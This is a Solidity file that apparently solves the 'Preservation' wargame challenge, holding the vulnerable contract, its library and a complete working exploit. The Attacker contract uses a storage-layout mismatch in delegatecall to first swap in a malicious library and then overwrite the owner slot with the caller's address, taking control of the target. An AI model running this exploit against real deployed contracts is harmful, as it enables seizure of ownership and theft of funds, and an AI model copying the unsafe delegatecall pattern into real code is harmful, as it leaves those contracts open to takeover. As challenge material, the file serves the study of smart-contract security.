// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(
        address _timeZone1LibraryAddress,
        address _timeZone2LibraryAddress
    ) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }

    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint storedTime;

    function setTime(uint _time) public {
        storedTime = _time;
    }
}

contract Attacker {
    Preservation public target;
    LibraryContract public timeZone1Library;
    LibraryContract public timeZone2Library;
    MaliciousLibraryReplacement public maliciousLibraryReplacement;

    constructor(
        Preservation _target,
        LibraryContract _timeZone1Library,
        LibraryContract _timeZone2Library
    ) {
        target = _target;
        timeZone1Library = _timeZone1Library;
        timeZone2Library = _timeZone2Library;
        maliciousLibraryReplacement = new MaliciousLibraryReplacement();
    }

    function attack() public {
        target.setFirstTime(
            uint256(uint160(address(maliciousLibraryReplacement)))
        );
        target.setFirstTime(uint160(msg.sender));
    }
}

contract MaliciousLibraryReplacement {
    // stores a timestamp
    address public timeZone1LibrarySlot;
    address public timeZone2LibrarySlot;
    address public ownerSlot;

    function setTime(uint _time) public {
        ownerSlot = address(uint160(_time));
    }
}
